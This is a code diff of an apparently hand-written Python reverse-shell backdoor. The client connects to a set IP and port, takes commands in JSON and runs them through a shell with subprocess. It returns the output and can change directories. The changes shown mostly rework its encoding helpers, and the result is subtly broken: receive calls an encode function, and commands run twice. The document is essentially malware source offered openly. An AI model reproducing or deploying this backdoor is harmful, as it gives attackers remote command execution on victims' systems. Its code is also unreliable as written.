@@ -3,7 +3,6 @@ import socket
 import subprocess
 import json
 import base64
-import sys
 
 
 class Backdoor:
@@ -14,24 +13,43 @@ class Backdoor:
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((self.ip, self.port))
 
+    def dataDecode(self, data) -> bytes:
+
+        if type(data) is bytes:
+            decode_data = data.decode("utf-8")
+            return decode_data
+
+        else:
+            return data
+
+    def dataEncode(self, data):
+
+        if type(data) is not bytes:
+            encode_data = data.encode("utf-8")
+            return encode_data
+
+        else:
+            return data
+
     def reliable_send(self, data):
         try:
-            data = data.decode("utf-8")
+            data = self.dataEncode(data)
         except:
             print("[-] decode error")
             pass
 
         json_data = json.dumps(data)
-        json_data = json_data.encode("utf-8")
+        json_data = self.dataEncode(json_data)
         self.connection.send(json_data)
-        print(f"[+] rel send -> {data}")
+        print("[+] rel send : \n{", f"{data}", "}")
 
     def reliable_receive(self):
         json_data = self.connection.recv(1024)
-        json_data = json_data.decode("utf-8")
+        json_data = self.dataEncode(json_data)
         command = json.loads(json_data)
         command = command.split(" ")
         print(f"[+] rcv -> {command}")
+
         return command
 
     def change_directory_tool(self, path):
@@ -43,8 +61,12 @@ class Backdoor:
             return "[-] No such file or directory"
 
     def execute_system_command(self, command):
+        print(command)
         try:
-            return subprocess.check_output(command, shell=True)
+            if subprocess.check_output(command, shell=True):
+                return subprocess.check_output(command, shell=True)
+            else:
+                return "[~] Command does not has return data"
         except subprocess.CalledProcessError:
             self.reliable_send("[-] Unknown command")
 
@@ -84,6 +106,7 @@ class Backdoor:
             except Exception:
                 command_result = "[-] Error during comand execution ::Client::"
                 self.reliable_send(command_result)
+
 
 if __name__ == "__main__":
     ip = "127.0.0.1"
